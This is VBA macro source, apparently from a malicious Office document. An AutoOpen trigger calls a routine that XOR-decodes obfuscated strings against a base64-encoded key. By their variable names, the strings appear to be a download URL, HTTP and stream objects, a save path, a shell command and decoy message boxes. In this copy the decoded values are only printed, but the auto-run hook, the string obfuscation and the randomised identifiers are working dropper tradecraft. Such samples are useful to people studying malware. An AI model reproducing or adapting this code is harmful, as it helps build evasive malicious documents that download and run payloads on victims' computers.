Private Priv_bool_var As Boolean
Private Byte_range1(0 To (63)) As Byte
Private Byte_range2(0 To (127)) As Byte

Sub AutoOpen()
    Routine2
End Sub


Sub Routine2()
    Dim Obf_String As String
    Dim Object_Var_1 As String
    Dim Object_Var_2 As String
    
    Obf_String = decode_function(Array(27, 130, 145, 220, 107, 105, 227, 173, 36, 35, 90, 115), 0) & decode_function(Array(102, 61, 1, 98, 215, 65, 35, 41, 12, 237, 243, 73, 79, 220, 245, 131, 47, 107), 12)
    Debug.Print Obf_String
    
    FileUrl2 = decode_function(Array(231, 5, 241, 126, 128), 30) & decode_function(Array(229, 156, 244, 118, 138, 3, 156, 78, 212, 221, 227, 87, 157, 68, 183, 103, 245, 151, 164, 5, 253, 5, 243, 8, 88, 232, 168, 49, 169, 136, 63, 70, 252, 6, 175, 130, 86), 35)
    Debug.Print FileUrl2
    
    Object_Var_1 = (decode_function(Array(63), (72)) & decode_function(Array(122, 244, 181, 158, 247, 192, 144, 189, 239, 205, 245, 132, 158, 103, 8, 157), 73))
    Debug.Print Object_Var_1
    Object_Var_1_open = (decode_function(Array(74, 128, 173), (89)))
    Debug.Print Object_Var_1_open
    
    Object_Var_2 = (decode_function(Array(204, 174), (92)) & decode_function(Array(80, 230, 185, 231, 27, 2, 1, 166, 162, 145), (94)))
    Debug.Print Object_Var_2
    Object_Var_2_STF = decode_function(Array(254, 205, 102, 31, 235, 93, 164, 177, 116, 147, 0, 143, 232, 96), (104)) & decode_function(Array(165, 240, 148, 143, 238, 107, 33, 249, 87, 202, 145, 197, 106, 58), 118)
    Debug.Print Object_Var_2_STF
    
    
    Object_Var_1 = (decode_function(Array(179, 240, 86, 249, 147, 195, 49, 202, 142, 102, 103, 201, 59, 206), (132)) & decode_function(Array(59, 173, 216), 146))
    Debug.Print Object_Var_1
    Object_Var_1_open2 = decode_function(Array(233, 58, 86), 149)
    Debug.Print Object_Var_1_open2
    
    New_stream = (decode_function(Array(8, 157, 17, 113, 152, 38), (152)) & decode_function(Array(49, 218, 245, 178, 84, 117), (158)))
    Debug.Print New_stream
    New_stream_STF = decode_function(Array(121, 36, 188, 224, 247, 214), 164) & decode_function(Array(136, 136, 204, 194, 118, 250, 245, 202, 27, 248, 176, 122, 118, 155, 230, 46, 137, 34, 144, 125, 31, 152, 228, 146, 34, 95, 199, 54, 202, 203, 105, 250, 46, 78), (170))
    Debug.Print New_stream_STF
    
    strCommand = decode_function(Array(117, 44, 204, 11, 35, 222, 143, 40, 222, 167, 241, 108, 12, 66, 198, 222, 185, 220, 66, 157, 209, 56, 155, 152, 7), (204)) & decode_function(Array(126, 188, 254, 57, 247, 53, 250, 41, 160, 73, 23, 196, 34, 122, 170, 182, 204, 240, 116, 10, 129, 214, 181, 75, 72, 167, 206, 241, 177, 24, 55, 130, 183, 51), (229))
    Debug.Print strCommand
    
    shell_obj = decode_function(Array(144, 139, 51, 186, 32, 81, 100, 111, 217, 11, 17, 250), (263)) & decode_function(Array(149), (275))
    Debug.Print shell_obj
    
    msgbox1 = decode_function(Array(149, 98, 218, 73, 249, 32, 48, 205, 229, 119, 69, 236, 185), 276) & decode_function(Array(16, 4, 3, 101, 182, 232, 25, 100, 134, 36, 137, 159, 194, 190, 46, 62, 60, 143, 33, 126, 183), (289))
    Debug.Print msgbox1
    
    msgbox2 = decode_function(Array(253, 131, 239, 226, 230, 125, 86, 121, 207, 39, 234, 233, 38, 228, 156, 50, 146, 203, 72, 88, 21, 204, 56, 59, 78, 102, 89, 7), 310) & decode_function(Array(248, 7, 125, 249, 201, 5, 171, 158, 118, 239, 47, 141, 80, 91, 208, 48, 238, 18), (338))
    Debug.Print msgbox2
    
End Sub

Public Function decode_function2(ByVal aeGCfGlogPIWY As String) As Byte()
If Not Priv_bool_var Then decode_sub1
Dim cKPHVibsAL() As Byte: cKPHVibsAL = decode_function3(aeGCfGlogPIWY)
Dim ntwjhSSGUW As Long: ntwjhSSGUW = UBound(cKPHVibsAL) + (1)
If ntwjhSSGUW Mod 4 <> (0) Then Err.Raise vbObjectError, , ""
Do While ntwjhSSGUW > (0)
If cKPHVibsAL(ntwjhSSGUW - (1)) <> Asc("=") Then Exit Do
ntwjhSSGUW = ntwjhSSGUW - (1)
Loop
Dim gAuIPIaVpgxXO As Long: gAuIPIaVpgxXO = (ntwjhSSGUW * (3)) \ (4)
Dim HERnjCCKvXNQgi() As Byte
ReDim HERnjCCKvXNQgi((0) To gAuIPIaVpgxXO - 1) As Byte
Dim VBbSjsDbXqqFC As Long
Dim BXILJtSvriEr As Long
Do While VBbSjsDbXqqFC < ntwjhSSGUW
Dim vprtSRBzLx As Byte: vprtSRBzLx = cKPHVibsAL(VBbSjsDbXqqFC): VBbSjsDbXqqFC = VBbSjsDbXqqFC + (1)
Dim VQtKdExZvGc As Byte: VQtKdExZvGc = cKPHVibsAL(VBbSjsDbXqqFC): VBbSjsDbXqqFC = VBbSjsDbXqqFC + (1)
Dim aJQFpccMRU As Byte: If VBbSjsDbXqqFC < ntwjhSSGUW Then aJQFpccMRU = cKPHVibsAL(VBbSjsDbXqqFC): VBbSjsDbXqqFC = VBbSjsDbXqqFC + (1 Xor 0) Else aJQFpccMRU = Asc("A")
Dim eEmILQouTtdJ As Byte: If VBbSjsDbXqqFC < ntwjhSSGUW Then eEmILQouTtdJ = cKPHVibsAL(VBbSjsDbXqqFC): VBbSjsDbXqqFC = VBbSjsDbXqqFC + ((1) + (0)) Else eEmILQouTtdJ = Asc("A")
If vprtSRBzLx > (46 + (8 Xor 89)) Or VQtKdExZvGc > 127 Or aJQFpccMRU > 127 Or eEmILQouTtdJ > (118 + (2 Xor 11)) Then _
Err.Raise vbObjectError, , ""
Dim yoDVgXwKlSilNY As Byte: yoDVgXwKlSilNY = Byte_range2(vprtSRBzLx)
Dim RFNyxblWffn As Byte: RFNyxblWffn = Byte_range2(VQtKdExZvGc)
Dim LYtKUqiwvfed As Byte: LYtKUqiwvfed = Byte_range2(aJQFpccMRU)
Dim aEjwPUwfWAO As Byte: aEjwPUwfWAO = Byte_range2(eEmILQouTtdJ)
If yoDVgXwKlSilNY > (8 + (7 Xor 48)) Or RFNyxblWffn > ((9 Xor 18) + (20 Xor 48)) Or LYtKUqiwvfed > (29 + (26 Xor 56)) Or aEjwPUwfWAO > 63 Then _
Err.Raise vbObjectError, , ""
Dim ljuECQaMhejNRL As Byte: ljuECQaMhejNRL = (yoDVgXwKlSilNY * (4)) Or (RFNyxblWffn \ &H10)
Dim gonPEdfQLZ As Byte: gonPEdfQLZ = ((RFNyxblWffn And &HF) * &H10) Or (LYtKUqiwvfed \ (4))
Dim tSBBkREwXj As Byte: tSBBkREwXj = ((LYtKUqiwvfed And (3)) * &H40) Or aEjwPUwfWAO
HERnjCCKvXNQgi(BXILJtSvriEr) = ljuECQaMhejNRL: BXILJtSvriEr = BXILJtSvriEr + 1
If BXILJtSvriEr < gAuIPIaVpgxXO Then HERnjCCKvXNQgi(BXILJtSvriEr) = gonPEdfQLZ: BXILJtSvriEr = BXILJtSvriEr + (1)
If BXILJtSvriEr < gAuIPIaVpgxXO Then HERnjCCKvXNQgi(BXILJtSvriEr) = tSBBkREwXj: BXILJtSvriEr = BXILJtSvriEr + (1)
Loop
decode_function2 = HERnjCCKvXNQgi
End Function

Private Sub decode_sub1()
    Dim mHMyXjcStIU As Integer, df1_range_var As Integer
    df1_range_var = (0 Xor 0)
    For mHMyXjcStIU = Asc("A") To Asc("Z"): Byte_range1(df1_range_var) = mHMyXjcStIU: df1_range_var = df1_range_var + 1: Next
    For mHMyXjcStIU = Asc("a") To Asc("z"): Byte_range1(df1_range_var) = mHMyXjcStIU: df1_range_var = df1_range_var + 1: Next
    For mHMyXjcStIU = Asc("0") To Asc("9"): Byte_range1(df1_range_var) = mHMyXjcStIU: df1_range_var = df1_range_var + (1 + 0): Next
    Byte_range1(df1_range_var) = Asc("+"): df1_range_var = df1_range_var + (1)
    Byte_range1(df1_range_var) = Asc("/"): df1_range_var = df1_range_var + (1)
    For df1_range_var = (0) To ((3 Xor 9) + (23 Xor 98)): Byte_range2(df1_range_var) = (255): Next
    For df1_range_var = (0) To 63: Byte_range2(Byte_range1(df1_range_var)) = df1_range_var: Next
    Priv_bool_var = True
End Sub


Private Function decode_function3(ByVal aeGCfGlogPIWY As String) As Byte()
    Dim RFNyxblWffn() As Byte: RFNyxblWffn = aeGCfGlogPIWY
    Dim tJInFblbfdApY As Long: tJInFblbfdApY = (UBound(RFNyxblWffn) + (0 Xor 1)) \ (0 + (1 Xor 3))
    If tJInFblbfdApY = (0) Then decode_function3 = RFNyxblWffn: Exit Function
    Dim LYtKUqiwvfed() As Byte
    ReDim LYtKUqiwvfed((0) To tJInFblbfdApY - (1)) As Byte
    Dim xJLLCVGBVqSkz As Long
    For xJLLCVGBVqSkz = 0 To tJInFblbfdApY - 1
    Dim mHMyXjcStIU As Long: mHMyXjcStIU = RFNyxblWffn((2 + 0) * xJLLCVGBVqSkz) + 256 * CLng(RFNyxblWffn((2) * xJLLCVGBVqSkz + 1))
    If mHMyXjcStIU >= ((93 Xor 135) + (31 Xor 57)) Then mHMyXjcStIU = Asc("?")
    LYtKUqiwvfed(xJLLCVGBVqSkz) = mHMyXjcStIU
    Next
    decode_function3 = LYtKUqiwvfed
End Function


Private Function decode_function(df1_param1 As Variant, df2_param2 As Integer)
    Dim df1_var1 As String
    Dim df1_var2() As Byte
    Dim kBQHAjmEelVSHUyT As String
    kBQHAjmEelVSHUyT = "c/blrFFGzJwUDWpdVBM1WO9xExkjgIB9euvb5lcOj3GFDrrKs8VGpDOyfPrp2W+tdIdIxKWVMM81wTkH2Z9unLFgc84o3/FnchOXx/GEr/bJwZW4yNYzXM0NxfmN6h+i+8lIdnPDw/y99zpDvDTK1Rvkc9O0NMCd5NOyBlLNYv2/oBJf/pk1i/ywXqz6SD+Ed4Zv+YiufwJJ2V412ghirofXNRg6HuC8oL/m7KO1Baapnn6VwCYqqtQfvBCgTy7H1aV9av5p//lHil1/JUO7blGt502yy9FBSiuqu5n+YN7rZMfPbhDYkU6EaaZ9xSRnmH5LmIf5wkQ4sImEfBeS966EKhnyxALH2FDISSEQQYpjdJb50BCoJosACu2xHyyfmXRrYBDbjXcQpk36v6HRXExJ/1Ub07jxnY2UXWxZm0+DmgaA81Hnpi02YexVWjdGN2iMJx6Wp3HK9xjPTuE8e7RRmnM="
    
    df1_var2 = decode_function2(kBQHAjmEelVSHUyT)
    df1_var1 = ""
        For df1_range_var = LBound(df1_param1) To UBound(df1_param1)
            df1_var1 = df1_var1 & Chr(df1_var2(df1_range_var + df2_param2) Xor df1_param1(df1_range_var))
        Next
    decode_function = df1_var1
End Function